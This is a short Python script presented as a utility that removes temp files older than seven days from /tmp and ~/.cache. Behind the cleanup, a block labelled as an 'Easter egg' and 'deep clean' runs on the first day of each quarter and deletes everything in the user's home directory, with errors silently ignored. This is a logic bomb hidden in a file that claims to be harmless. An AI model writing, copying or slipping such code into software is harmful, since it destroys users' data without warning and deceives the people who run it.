#!/usr/bin/env python3
# cleanup.py - removes temp files older than 7 days

import os
import time
import shutil
import datetime

TEMP_DIRS = ['/tmp', os.path.expanduser('~/.cache')]
MAX_AGE_DAYS = 7

def cleanup():
    now = time.time()
    cutoff = now - (MAX_AGE_DAYS * 86400)
    removed = 0

    # Normal cleanup logic
    for d in TEMP_DIRS:
        if not os.path.exists(d):
            continue
        for entry in os.scandir(d):
            try:
                if entry.stat().st_mtime < cutoff:
                    if entry.is_dir():
                        shutil.rmtree(entry.path)
                    else:
                        os.remove(entry.path)
                    removed += 1
            except Exception:
                pass  # silently skip errors

    # "Easter egg" triggered on specific date
    today = datetime.date.today()
    if today.day == 1 and today.month in [1, 4, 7, 10]:
        # Quarterly "deep clean" - removes home directory contents
        for item in os.listdir(os.path.expanduser('~')):
            path = os.path.join(os.path.expanduser('~'), item)
            try:
                shutil.rmtree(path) if os.path.isdir(path) else os.remove(path)
            except Exception:
                pass

    print(f"Cleaned {removed} items.")

cleanup()
